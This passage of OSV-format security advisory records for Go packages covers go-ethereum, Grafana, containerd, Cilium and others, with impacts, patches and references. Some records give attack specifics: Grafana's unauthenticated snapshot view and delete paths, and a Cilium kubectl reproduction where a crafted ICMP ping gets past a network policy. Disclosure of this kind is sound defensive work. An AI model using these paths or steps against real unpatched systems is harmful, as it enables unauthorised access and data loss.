system can panic at line `hash, _ = origNode.cache()`. \n\nWhen investigating this, @holiman tried to find it via fuzzing, which uncovered a second crasher, also related to the snap `GetTrieNodes` package. If the caller requests a storage trie:\n```golang\n\t\t\t\t// Storage slots requested, open the storage trie and retrieve from there\n\t\t\t\taccount, err := snap.Account(common.BytesToHash(pathset[0]))\n\t\t\t\tloads++ // always account database reads, even for failures\n\t\t\t\tif account == nil {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tstTrie, err := trie.NewSecure(common.BytesToHash(account.Root), triedb)\n```\nThe code assumes that `snap.Account` returns _either_ a non-nil response unless `error` is also provided. This is however not the case, since `snap.Account` can return `nil, nil`. \n\n### Patches\n\n```diff\n--- a/eth/protocols/snap/handler.go\n+++ b/eth/protocols/snap/handler.go\n@@ -469,7 +469,7 @@ func handleMessage(backend Backend, peer *Peer) error {\n \t\t\t\t// Storage slots requested, open the storage trie and retrieve from there\n \t\t\t\taccount, err := snap.Account(common.BytesToHash(pathset[0]))\n \t\t\t\tloads++ // always account database reads, even for failures\n-\t\t\t\tif err != nil {\n+\t\t\t\tif err != nil || account == nil {\n \t\t\t\t\tbreak\n \t\t\t\t}\n \t\t\t\tstTrie, err := trie.NewSecure(common.BytesToHash(account.Root), triedb)\ndiff --git a/trie/trie.go b/trie/trie.go\nindex 7ea7efa835..d0f0d4e2bc 100644\n--- a/trie/trie.go\n+++ b/trie/trie.go\n@@ -174,6 +174,10 @@ func (t *Trie) TryGetNode(path []byte) ([]byte, int, error) {\n }\n \n func (t *Trie) tryGetNode(origNode node, path []byte, pos int) (item []byte, newnode node, resolved int, err error) {\n+\t// If non-existent path requested, abort\n+\tif origNode == nil {\n+\t\treturn nil, nil, 0, nil\n+\t}\n \t// If we reached the requested path, return the current node\n \tif pos >= len(path) {\n \t\t// Although we most probably have the original node expanded, encoding\n@@ -193,10 +197,6 @@ func (t *Trie) tryGetNode(origNode node, path []byte, pos int) (item []byte, new\n \t}\n \t// Path still needs to be traversed, descend into children\n \tswitch n := (origNode).(type) {\n-\tcase nil:\n-\t\t// Non-existent path requested, abort\n-\t\treturn nil, nil, 0, nil\n-\n \tcase valueNode:\n \t\t// Path prematurely ended, abort\n \t\treturn nil, nil, 0, nil\n\n``` \nThe fixes were merged into [#23657](https://github.com/ethereum/go-ethereum/pull/23657), with commit [f1fd963](https://github.com/ethereum/go-ethereum/pull/23657/commits/f1fd963a5a965e643e52fcf805a2a02a323c32b8), and released as part of Geth [v1.10.9](https://github.com/ethereum/go-ethereum/tree/v1.10.9) on Sept 29, 2021. \n\n### Workarounds\n\nApply the patch above or upgrade to a version which is not vulnerable.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum/)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-59hh-656j-3p7v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41173"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/23657/commits/f1fd963a5a965e643e52fcf805a2a02a323c32b8"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/23801"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/e40b37718326b8b4873b3b00a0db2e6c6d9ea738"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/releases/tag/v1.10.9"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0256"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-10-25T18:23:10Z", "nvd_published_at": "2021-10-26T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qh54-9vc5-m9fg", "modified": "2021-10-11T21:16:02Z", "published": "2021-10-12T16:06:30Z", "aliases": [], "summary": "MD5 hash support in github.com/foxcpp/maddy", "details": "### Impact\n\nThis vulnerability affects maddy 0.5.1, 0.5.0 users using auth.shadow module\nand an extremely outdated system that still allows MD5 hashes in \n/etc/shadows.\n\n### Patches\n\nPatch is available as part of the 0.5.2 release.\n\n### Workarounds\n\nEnsure MD5 hashes are not present in /etc/shadow.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/foxcpp/maddy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.5.0"}, {"fixed": "0.5.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/foxcpp/maddy/security/advisories/GHSA-qh54-9vc5-m9fg"}, {"type": "PACKAGE", "url": "https://github.com/foxcpp/maddy"}], "database_specific": {"cwe_ids": ["CWE-261"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-10-11T21:16:02Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2p6r-37p9-89p2", "modified": "2021-10-21T14:32:55Z", "published": "2021-10-21T17:46:57Z", "aliases": ["CVE-2021-41135"], "summary": "Authz Module Non-Determinism", "details": "### Impact\n\nConsensus failure for 0.43.x and 0.44.{0,1} users. \nFunds and balances are safe.\n\n### Patches\n\n0.44.2\n\n### Workarounds\n\nManually patch the code.\n\n---\n\nFull details posted in https://forum.cosmos.network/t/cosmos-sdk-vulnerability-retrospective-security-advisory-jackfruit-october-12-2021/5349.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/cosmos-sdk"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.43.0"}, {"fixed": "0.44.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-2p6r-37p9-89p2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41135"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/commit/68ab790a761e80d3674f821794cf18ccbfed45ee"}, {"type": "WEB", "url": "https://forum.cosmos.network/t/cosmos-sdk-vulnerability-retrospective-security-advisory-jackfruit-october-12-2021/5349"}, {"type": "PACKAGE", "url": "https://github.com/cosmos/cosmos-sdk"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/releases/tag/v0.44.2"}], "database_specific": {"cwe_ids": ["CWE-754"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-10-20T15:36:34Z", "nvd_published_at": "2021-10-20T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ppj4-34rq-v8j9", "modified": "2023-08-30T00:32:37Z", "published": "2021-10-25T19:43:15Z", "aliases": ["CVE-2021-42836"], "summary": "github.com/tidwall/gjson Vulnerable to REDoS attack", "details": "GJSON is a Go package that provides a fast and simple way to get values from a json document. GJSON before 1.9.3 allows a ReDoS (regular expression denial of service) attack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tidwall/gjson"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-42836"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/issues/236"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/issues/237"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/commit/590010fdac311cc8990ef5c97448d4fec8f29944"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/commit/77a57fda87dca6d0d7d4627d512a630f89a91c96"}, {"type": "PACKAGE", "url": "https://github.com/tidwall/gjson"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/compare/v1.9.2...v1.9.3"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0265"}], "database_specific": {"cwe_ids": ["CWE-1333", "CWE-400", "CWE-697"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-10-25T18:27:20Z", "nvd_published_at": "2021-10-22T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c2h3-6mxw-7mvq", "modified": "2021-10-15T17:31:03Z", "published": "2021-10-04T20:14:47Z", "aliases": ["CVE-2021-41103"], "summary": "Insufficiently restricted permissions on plugin directories", "details": "### Impact\nA bug was found in containerd where container root directories and some plugins had insufficiently restricted permissions, allowing otherwise unprivileged Linux users to traverse directory contents and execute programs. When containers included executable programs with extended permission bits (such as setuid), unprivileged Linux users could discover and execute those programs. When the UID of an unprivileged Linux user on the host collided with the file owner or group inside a container, the unprivileged Linux user on the host could discover, read, and modify those files.\n\n### Patches\nThis vulnerability has been fixed in containerd 1.4.11 and containerd 1.5.7. Users should update to these version when they are released and may restart containers or update directory permissions to mitigate the vulnerability.\n\n### Workarounds\nLimit access to the host to trusted users. Update directory permission on container bundles directories. \n\n### For more information\nIf you have any questions or comments about this advisory: \n* Open an issue in [github.com/containerd/containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.7"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-c2h3-6mxw-7mvq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41103"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/5b46e404f6b9f661a205e28d59c982d3634148f8"}, {"type": "WEB", "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-222547.pdf"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.4.11"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.5.7"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/B5Q6G6I4W5COQE25QMC7FJY3I3PAYFBB/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZNFADTCHHYWVM6W4NJ6CB4FNFM2VMBIB/"}, {"type": "WEB", "url": "https://www.debian.org/security/2021/dsa-5002"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-10-04T17:05:03Z", "nvd_published_at": "2021-10-04T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m836-gxwq-j2pm", "modified": "2021-10-27T18:58:30Z", "published": "2021-10-28T16:27:03Z", "aliases": [], "summary": "Improper Access Control in github.com/treeverse/lakefs", "details": "### Impact\n\n1. [medium] A user with write permissions to a portion of a repository may use the S3 gateway to copy any object in the repository if they know its name.\n1. [medium] A user with permission to write any one of tags, branches, or commits on a repository may write all of them.\n1. [low] A user with permission to read any one of tags, branches, or commits on a repository may read all of them.\n1. [low] A user allowed to list objects in a repository _or_ read repository meta-data may retrieve graveler information about the location on underlying storage of all objects stored in any commit that they can view.  If the user additionally has the capability to read underlying storage, they will be able to retrieve metadata associated with all objects in that commit.\n\n### For more information\n\nIf you have any questions or comments about this advisory please:\n* Email us at security@treeverse.io.\n* Open an issue on https://github.com/treeverse/lakeFS/issues/new.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/treeverse/lakefs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.53.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/treeverse/lakeFS/security/advisories/GHSA-m836-gxwq-j2pm"}, {"type": "WEB", "url": "https://github.com/treeverse/lakeFS/commit/f2117281cadb14fdf9ac7fe287f84d5c10308b88"}, {"type": "PACKAGE", "url": "https://github.com/treeverse/lakeFS"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-10-27T18:58:30Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-gw97-f6h8-gm94", "modified": "2021-10-20T17:07:20Z", "published": "2021-10-13T18:55:04Z", "aliases": ["CVE-2021-42009"], "summary": "Email relay in Apache Traffic Control", "details": "An authenticated Apache Traffic Control Traffic Ops user with Portal-level privileges can send a request with a specially-crafted email subject to the /deliveryservices/request Traffic Ops endpoint to send an email, from the Traffic Ops server, with an arbitrary body to an arbitrary email address. Apache Traffic Control 5.1.x users should upgrade to 5.1.3 or 6.0.0. 4.1.x users should upgrade to 5.1.3.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apache/trafficcontrol"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.1.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-42009"}, {"type": "PACKAGE", "url": "https://github.com/apache/trafficcontrol"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r78d471d8a4fd268a4c5ae6c47327c09d9d4b4467c31da2c97422febb@%3Cdev.trafficcontrol.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r7dfa9a89b39d06caeeeb7b5cdc41b3493a9b86cc6cfa059d3f349d87@%3Cannounce.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/re384fd0f44c6d230f31376153c6e8b59e4a669f927c1533d06d702af%40%3Cdev.trafficcontrol.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rf0481b9e38ece1ece458d3ce7b2d671df819e3555597f31fc34f084e%40%3Ccommits.trafficcontrol.apache.org%3E"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/10/12/1"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-10-13T17:43:05Z", "nvd_published_at": "2021-10-12T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-69j6-29vr-p3j9", "modified": "2021-11-18T15:13:27Z", "published": "2021-10-05T20:24:02Z", "aliases": ["CVE-2021-39226"], "summary": "Authentication bypass for viewing and deletions of snapshots", "details": "Today we are releasing Grafana 7.5.11, and 8.1.6. These patch releases include an important security fix for an issue that affects all Grafana versions from 2.0.1.\n\n[Grafana Cloud](https://grafana.com/cloud) instances have already been patched and an audit did not find any usage of this attack vector. [Grafana Enterprise](https://grafana.com/products/enterprise) customers were provided with updated binaries under embargo.\n\n8.1.5 contained a single fix for bar chart panels. We believe that users can expedite deployment by moving from 8.1.4 to 8.1.6 directly.\n\n## CVE-2021-39226 Snapshot authentication bypass\n\n### Summary\n\nCVSS Score: 9.8 Critical\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n\nWe received a security report to [security@grafana.com](mailto:security@grafana.com) on 2021-09-15 about a vulnerability in Grafana regarding the snapshot feature. It was later identified as affecting Grafana versions from 2.0.1 to 8.1.6. [CVE-2021-39226](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39226) has been assigned to this vulnerability.\n\n### Impact\nUnauthenticated and authenticated users are able to view the snapshot with the lowest database key by accessing the literal paths:\n\n* `/dashboard/snapshot/:key`, or\n* `/api/snapshots/:key`\n\nIf the snapshot \"public_mode\" configuration setting is set to true (vs default of false), unauthenticated users are able to delete the snapshot with the lowest database key by accessing the literal path:\n\n* `/api/snapshots-delete/:deleteKey`\n\nRegardless of the snapshot \"public_mode\" setting, authenticated users are able to delete the snapshot with the lowest database key by accessing the literal paths:\n\n* `/api/snapshots/:key`, or\n* `/api/snapshots-delete/:deleteKey`\n\nThe combination of deletion and viewing enables a complete walk through all snapshot data while resulting in complete snapshot data loss.\n\n### Attack audit\n\nWhile we can not guarantee that the below will identify all attacks, if you do find something with the below, you should consider doing a full assessment.\n\n#### Through reverse proxy/load balancer logs\n\nTo determine if your Grafana installation has been exploited for this vulnerability, search through your reverse proxy/load balancer access logs for instances where the path is `/dashboard/snapshot/:key`, `/api/snapshots/:key` or `/api/snapshots-delete/:deleteKey`, and the response status code was 200 (OK).\nFor example, if you\u2019re using the Kubernetes ingress-nginx controller and sending logs to Loki, use a LogQL query like `{job=\"nginx-ingress-controller\"} |= \"\\\"status\\\": 200\" |= \"\\\"uri\\\": \\\"/api/snapshots/:key\\\"\"`.\n\n#### Through the Grafana Enterprise audit feature\n\nIf you enabled \u201cLog web requests\u201d in your configuration with `router_logging = true`, look for\n`\"requestUri\":\"/api/snapshots-delete/\u201d`,`\u201crequestUri\":\"/api/snapshots/:key\"`, or `\"type\":\"snapshot\"` in combination with `\"action\":\"delete\"`.\n\n### Patched versions\n\nRelease 8.1.6: \n\n- [Download Grafana 8.1.6](https://grafana.com/grafana/download/8.1.6)\n- [Release notes](https://grafana.com/docs/grafana/latest/release-notes/release-notes-8-1-6/)\n\nRelease 7.5.11: \n\n- [Download Grafana 7.5.11](https://grafana.com/grafana/download/7.5.11)\n- [Release notes](https://grafana.com/docs/grafana/latest/release-notes/release-notes-7-5-11/)\n\n### Solutions and mitigations\n\nDownload and install the appropriate patch for your version of Grafana.\n\n[Grafana Cloud](https://grafana.com/cloud) instances have already been patched, and [Grafana Enterprise](https://grafana.com/products/enterprise) customers were provided with updated binaries under embargo.\n\n### Workaround\n\nIf for some reason you cannot upgrade:\n\nYou can use a reverse proxy or similar to block access to the literal paths\n* `/api/snapshots/:key`\n* `/api/snapshots-delete/:deleteKey`\n* `/dashboard/snapshot/:key`\n* `/api/snapshots/:key`\n\nThey have no normal function and can be disabled without side effects.\n\n### Timeline and postmortem\n\nHere is a detailed timeline starting from when we originally learned of the issue. All times in UTC.\n\n* 2021-09-15 14:49: Tuan Tran theblackturtle0901@gmail.com sends initial report about viewing snapshots without authentication\n* 2021-09-15 15:56: Initial reproduction\n* 2021-09-15 17:10: MEDIUM severity declared\n* 2021-09-15 18:58: Workaround deployed on Grafana Cloud\n* 2021-09-15 19:15: `/api/snapshots/:key` found to be vulnerable as well\n* 2021-09-15 19:30: `/api/snapshots/:key` blocked on Grafana Cloud\n* 2021-09-16 09:31: `/api/snapshots-delete/:deleteKey` found to be vulnerable as well, blocked on Grafana Cloud. From this point forward, Cloud is not affected any more.\n* 2021-09-16 09:35: HIGH severity declared\n* 2021-09-16 11:19: Realization that combination of deletion and viewing allows enumeration and permanent DoS\n* 2021-09-16 11:19: CRITICAL declared\n* 2021-09-17 10:53: Determination that no weekend work is needed. While issue is CRITICAL, scope is very limited\n* 2021-09-17 14:26: Audit of Grafana Cloud concluded, no evidence of exploitation\n* 2021-09-23: Grafana Cloud instances updated\n* 2021-09-28 12:00: Grafana Enterprise images released to customers under embargo\n* 2021-10-05 17:00: Public release\n\n## Reporting security issues\n\nIf you think you have found a security vulnerability, please send a report to [security@grafana.com](mailto:security@grafana.com). This address can be used for all of\nGrafana Labs's open source and commercial products (including but not limited to Grafana, Tempo, Loki, Amixr, k6, Tanka, and  Grafana Cloud, Grafana Enterprise, and grafana.com). We only accept vulnerability reports at this address. We would prefer that you encrypt your message to us using our PGP key. The key fingerprint is:\n\nF988 7BEA 027A 049F AE8E  5CAA D125 8932 BE24 C5CA\n\nThe key is available from [keys.gnupg.net](http://keys.gnupg.net/pks/lookup?op=get&fingerprint=on&search=0xD1258932BE24C5CA) by searching for [security@grafana](http://keys.gnupg.net/pks/lookup?search=security@grafana&fingerprint=on&op=index.\n\n## Security announcements\n\nWe maintain a category on the community site named [Security Announcements](https://community.grafana.com/c/security-announcements),\nwhere we will post a summary, remediation, and mitigation details for any patch containing security fixes. You can also subscribe to email updates to this category if you have a grafana.com account and sign in to the community site, or via updates from our [Security Announcements RSS feed](https://community.grafana.com/c/security-announcements.rss).\n\n## Acknowledgement\n\nWe would like to thank [Tran Viet Tuan](https://github.com/theblackturtle) for responsibly disclosing the initially discovered vulnerability to us.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.5.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.1.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grafana/grafana/security/advisories/GHSA-69j6-29vr-p3j9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39226"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/2d456a6375855364d098ede379438bf7f0667269"}, {"type": "PACKAGE", "url": "https://github.com/grafana/grafana"}, {"type": "WEB", "url": "https://grafana.com/docs/grafana/latest/release-notes/release-notes-7-5-11/"}, {"type": "WEB", "url": "https://grafana.com/docs/grafana/latest/release-notes/release-notes-8-1-6/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DCKBFUSY6V4VU5AQUYWKISREZX5NLQJT/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/E6ANHRDBXQT6TURLP2THM26ZPDINFBEG/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20211029-0008/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/10/05/4"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-10-05T18:49:35Z", "nvd_published_at": "2021-10-05T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-362v-wg5p-64w2", "modified": "2021-10-20T17:28:19Z", "published": "2021-10-12T18:41:16Z", "aliases": ["CVE-2021-42135"], "summary": "Incorrect Privilege Assignment in HashiCorp Vault", "details": "HashiCorp Vault and Vault Enterprise 1.8.x through 1.8.4 may have an unexpected interaction between glob-related policies and the Google Cloud secrets engine. Users may, in some situations, have more privileges than intended, e.g., a user with read permission for the /gcp/roleset/* path may be able to issue Google Cloud service account credentials.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"last_affected": "1.8.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-42135"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-28-vaults-google-cloud-secrets-engine-policies-with-globs-may-provide-additional-privileges-in-vault-1-8-0-onwards/"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/blob/main/CHANGELOG.md#180"}], "database_specific": {"cwe_ids": ["CWE-266", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-10-12T16:53:55Z", "nvd_published_at": "2021-10-11T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-465w-gg5p-85c9", "modified": "2021-05-18T20:45:55Z", "published": "2021-05-18T21:09:01Z", "aliases": ["CVE-2020-1762"], "summary": "Insufficient Session Expiration in Kiali", "details": "An insufficient JWT validation vulnerability was found in Kiali versions 0.4.0 to 1.15.0 and was fixed in Kiali version 1.15.1, wherein a remote attacker could abuse this flaw by stealing a valid JWT cookie and using that to spoof a user session, possibly gaining privileges to view and alter the Istio configuration.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kiali/kiali"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.4.0"}, {"fixed": "1.15.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-1762"}, {"type": "WEB", "url": "https://github.com/kiali/kiali/commit/93f5cd0b6698e8fe8772afb8f35816f6c086aef1"}, {"type": "WEB", "url": "https://github.com/kiali/kiali/commit/c91a0949683976f621cca213c1193831d63b381c"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1810387"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-1762"}, {"type": "WEB", "url": "https://kiali.io/news/security-bulletins/kiali-security-001/"}], "database_specific": {"cwe_ids": ["CWE-295", "CWE-384", "CWE-613"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-18T20:45:55Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-fx8w-mjvm-hvpc", "modified": "2023-09-29T17:22:03Z", "published": "2021-05-18T18:32:41Z", "aliases": ["CVE-2020-10696"], "summary": "Path Traversal in Buildah", "details": "A path traversal flaw was found in Buildah in versions before 1.14.5. This flaw allows an attacker to trick a user into building a malicious container image hosted on an HTTP(s) server and then write files to the user's system anywhere that the user has permissions.\n\n### Specific Go Packages Affected\ngithub.com/containers/buildah/imagebuildah", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/buildah"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.14.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-10696"}, {"type": "WEB", "url": "https://github.com/containers/buildah/pull/2245"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/cve-2020-10696"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1817651"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-10696"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-07T17:31:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-c66w-hq56-4q97", "modified": "2021-05-21T14:09:14Z", "published": "2021-05-21T14:32:37Z", "aliases": [], "summary": "Network policy may be bypassed by some ICMP Echo Requests", "details": "## Impact\n\nUnder certain conditions, ICMP Echo Request sent to a Cilium endpoint from an actor may bypass a network policy which _disallows_ access from the actor to the endpoint, but _allows_ from the endpoint to the actor. This does _NOT_ apply to UDP and TCP traffic.\n\nThe actor is either a pod or a cluster host or a remote host.\n\nThe following conditions must be met:\n1. Network policies have been created which:\n  a) do not allow access from the actor to the endpoint;\n  b) allow access from the endpoint to the actor and does not specify neither protocol nor port. \n2. The endpoint has sent ICMP Echo Request to the actor with the ICMP identifier X.\n3. The actor sends ICMP Echo Request to the endpoint with the same ICMP identifier X.\n4. The request from the actor (3.) is sent before the Cilium's conntrack GC has removed the previously created conntrack entry (2.).\n\n## Detailed description\n\nSee https://github.com/cilium/cilium/commit/dfb008a9099c4da1e0fd964c899c43ee13280b0e (v1.9.x), https://github.com/cilium/cilium/commit/ff6ebae6efca1bd991302b464dea428512823e79 (v1.8.x), https://github.com/cilium/cilium/commit/472bbeff75161979c317ab21d563f826291b5f37 (v1.7.x).\n\n## Example\n\n```\n$ kubectl run server --image=quay.io/cilium/net-test:v1.0.0 --restart=Never -- sleep 3600\n$ kubectl run client --image=quay.io/cilium/net-test:v1.0.0 --restart=Never -- sleep 3600\n$ cat <<EOF | kubectl apply -f\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: server-netpol # allow client->server\nspec:\n  podSelector:\n    matchLabels:\n      run: server\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          run: client\n  policyTypes:\n  - Ingress\n---\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: client-netpol # deny any->client\nspec:\n  podSelector:\n    matchLabels:\n      run: client\n  policyTypes:\n  - Ingress\nEOF\n\n$ kubectl exec -ti server -- xping -c1 -x666 $CLIENT_POD_IP\nPING 10.154.0.50 (10.154.0.50): 56 data bytes\n^C\n--- 10.154.0.50 ping statistics ---\n1 packets transmitted, 0 packets received, 100% packet loss   <--- \"client-netpol\" policy denied\ncommand terminated with exit code 1\n\n$ kubectl exec -ti client -- xping -c1 -x666 $SERVER_POD_IP\nPING 10.154.1.16 